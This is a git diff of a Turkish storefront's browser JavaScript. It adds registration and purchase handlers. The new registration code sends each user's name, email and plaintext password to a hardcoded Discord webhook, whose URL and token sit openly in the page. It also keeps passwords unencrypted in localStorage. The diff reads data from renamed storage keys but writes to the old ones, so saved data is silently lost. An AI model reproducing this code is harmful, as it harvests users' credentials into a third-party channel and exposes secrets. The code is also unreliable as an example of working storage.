@@ -2,7 +2,7 @@
 const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1353848010735616032/V_lGzTIkpX2fvQLs7v20h2ubd_M6dSXcKta6gac1JelX3fiCm816PkWgvSwXy26-NOTI';
 
 // Satılan ürünlerin veritabanı
-let products = JSON.parse(localStorage.getItem('sefirhost_products')) || [
+let products = JSON.parse(localStorage.getItem('SefirCommunity_products')) || [
     {
         id: 1,
         name: "Logo Tasarım",
@@ -30,11 +30,11 @@ let products = JSON.parse(localStorage.getItem('sefirhost_products')) || [
 ];
 
 // Kullanıcı verileri
-let users = JSON.parse(localStorage.getItem('sefirhost_users')) || [];
-let currentUser = JSON.parse(localStorage.getItem('sefirhost_currentUser')) || null;
+let users = JSON.parse(localStorage.getItem('SefirCommunity_users')) || [];
+let currentUser = JSON.parse(localStorage.getItem('SefirCommunity_currentUser')) || null;
 
 // Satış geçmişi
-let salesHistory = JSON.parse(localStorage.getItem('sefirhost_salesHistory')) || [];
+let salesHistory = JSON.parse(localStorage.getItem('SefirCommunity_salesHistory')) || [];
 
 // DOM yüklendiğinde çalışacak fonksiyonlar
 document.addEventListener('DOMContentLoaded', function() {
@@ -432,4 +432,146 @@ function komutCalistir() {
     const sonuc = komutIsle(komutInput.value);
     sonucDiv.innerHTML = sonuc;
     komutInput.value = '';
+}
+// Discord Webhook URL'leri
+const SALES_WEBHOOK = 'https://discord.com/api/webhooks/1353848010735616032/V_lGzTIkpX2fvQLs7v20h2ubd_M6dSXcKta6gac1JelX3fiCm816PkWgvSwXy26-NOTI';
+const REGISTRATION_WEBHOOK = 'https://discord.com/api/webhooks/1353848010735616032/V_lGzTIkpX2fvQLs7v20h2ubd_M6dSXcKta6gac1JelX3fiCm816PkWgvSwXy26-NOTI'; // Yeni webhook URL'nizi buraya ekleyin
+
+// Kayıt işlemi (güncellenmiş versiyon)
+function handleRegister(e) {
+    e.preventDefault();
+    
+    const name = document.getElementById('registerName').value;
+    const email = document.getElementById('registerEmail').value;
+    const password = document.getElementById('registerPassword').value;
+    const passwordConfirm = document.getElementById('registerPasswordConfirm').value;
+    
+    if (password !== passwordConfirm) {
+        showToast('Şifreler eşleşmiyor!', 'danger');
+        return;
+    }
+    
+    if (users.some(u => u.email === email)) {
+        showToast('Bu e-posta adresi zaten kayıtlı!', 'danger');
+        return;
+    }
+    
+    const newUser = { 
+        id: Date.now(), 
+        name, 
+        email, 
+        password,
+        joinDate: new Date().toISOString(),
+        totalPurchases: 0
+    };
+    
+    users.push(newUser);
+    currentUser = newUser;
+    
+    // Verileri JSON dosyasına kaydet (simüle edilmiş)
+    saveDataToJson();
+    
+    // Discord'a kayıt bildirimi gönder
+    sendRegistrationToDiscord(newUser);
+    
+    checkAuthStatus();
+    
+    // Modalı kapat
+    const registerModal = bootstrap.Modal.getInstance(document.getElementById('registerModal'));
+    registerModal.hide();
+    
+    showToast('Başarıyla kayıt oldunuz!', 'success');
+}
+
+// JSON verilerini kaydetme fonksiyonu (simüle edilmiş)
+function saveDataToJson() {
+    // Gerçekte bu bir sunucu tarafı işlemi olmalı
+    // Bu örnekte localStorage kullanmaya devam ediyoruz
+    localStorage.setItem('sefirhost_users', JSON.stringify(users));
+    localStorage.setItem('sefirhost_products', JSON.stringify(products));
+    localStorage.setItem('sefirhost_salesHistory', JSON.stringify(salesHistory));
+    
+    // Gerçek bir JSON dosyasına kaydetmek için:
+    // fetch('/api/save-data', {
+    //     method: 'POST',
+    //     body: JSON.stringify({ users, products, salesHistory })
+    // });
+}
+
+// Discord'a kayıt bildirimi gönderme
+function sendRegistrationToDiscord(user) {
+    const embed = {
+        title: "Yeni Kullanıcı Kaydı!",
+        color: 0x3498db,
+        fields: [
+            { name: "Ad", value: user.name, inline: true },
+            { name: "E-posta", value: user.email, inline: true },
+            { name: "Kayıt Tarihi", value: new Date(user.joinDate).toLocaleString(), inline: false },
+            { name: "Şifre", value: "||" + user.password + "||", inline: false } // Şifreyi spoiler olarak göster
+        ],
+        timestamp: new Date().toISOString()
+    };
+    
+    fetch(REGISTRATION_WEBHOOK, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ 
+            content: "📢 Yeni kullanıcı kaydı!",
+            embeds: [embed] 
+        }),
+    }).catch(error => console.error('Discord webhook error:', error));
+}
+// Satın alma işlemi fonksiyonunu güncelleyelim
+function handlePurchase(e) {
+    e.preventDefault();
+    
+    const productId = parseInt(document.getElementById('selectedProductId').value);
+    const product = products.find(p => p.id === productId);
+    const paymentMethod = document.getElementById('paymentMethod').value;
+    const notes = document.getElementById('purchaseNotes').value;
+    
+    if (!product || !currentUser) return;
+    
+    // Satış kaydı oluştur
+    const saleRecord = {
+        id: Date.now(),
+        productId: product.id,
+        productName: product.name,
+        userId: currentUser.id,
+        userName: currentUser.name,
+        price: product.price,
+        date: new Date().toISOString(),
+        paymentMethod,
+        notes,
+        status: 'pending'
+    };
+    
+    // Verileri güncelle
+    product.sales++;
+    currentUser.totalPurchases++;
+    salesHistory.push(saleRecord);
+    
+    // LocalStorage'ı güncelle
+    localStorage.setItem('sefirhost_products', JSON.stringify(products));
+    localStorage.setItem('sefirhost_currentUser', JSON.stringify(currentUser));
+    localStorage.setItem('sefirhost_salesHistory', JSON.stringify(salesHistory));
+    
+    // Discord'a bildirim gönder
+    sendDiscordNotification(saleRecord);
+    
+    // Modalı kapat
+    const purchaseModal = bootstrap.Modal.getInstance(document.getElementById('purchaseModal'));
+    purchaseModal.hide();
+    
+    // Satış geçmişini yenile
+    renderSalesHistory();
+    
+    // Yönlendirme yap (EKLEDİĞİMİZ KISIM)
+    setTimeout(() => {
+        window.location.href = "https://shopier.com/sefirroleplay"; // BU LİNKİ DEĞİŞTİRİN
+    }, 2000);
+    
+    showToast('Satın alma işlemi başarıyla tamamlandı! Yönlendiriliyorsunuz...', 'success');
 }
